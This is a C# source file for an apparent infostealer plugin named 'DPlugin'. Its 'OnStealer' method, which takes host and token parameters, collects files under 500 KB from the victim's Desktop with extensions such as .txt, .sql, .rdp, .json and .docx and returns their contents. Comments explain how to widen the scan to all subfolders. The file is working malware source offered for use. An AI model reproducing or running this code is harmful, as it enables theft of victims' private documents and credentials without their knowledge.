using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


public class DPlugin
{
    public List<object[]> OnStealer(string HOST, string TOKEN, string PATH)
    {
        List<object[]> Content = new List<object[]>();
        List<string> Names = new List<string>();
        List<string> Paths = new List<string>();

        Paths.AddRange(Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.TopDirectoryOnly)); //Replace SearchOption.TopDirectoryOnly to SearchOption.AllDirectories if you want all files.

        //Uncomment this if you want scan folders.
        //foreach (string dir in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.TopDirectoryOnly))
        //    Paths.AddRange(Directory.GetFiles(dir, "*.*", SearchOption.TopDirectoryOnly));

        foreach (string file in Paths)
        {
            if (new FileInfo(file).Length <= 500000 && new List<string> { ".txt", ".sql", ".dat", ".ini", ".pdf", ".rdp", ".xml", ".json", ".doc", ".docx" }.Contains(Path.GetExtension(file).ToLower()))
            {
                object[] fileData = new object[2];

                string filename = Path.GetFileName(file);

                int num = 1;
                while (Names.Contains(filename))
                {
                    filename = Path.GetFileNameWithoutExtension(file) + $" ({num})" + Path.GetExtension(file);
                    num++;
                }
                Names.Add(filename);

                fileData[0] = "Desktop Files/" + filename;
                fileData[1] = File.ReadAllBytes(file);

                Content.Add(fileData);
            }
        }

        return Content;
    }
}
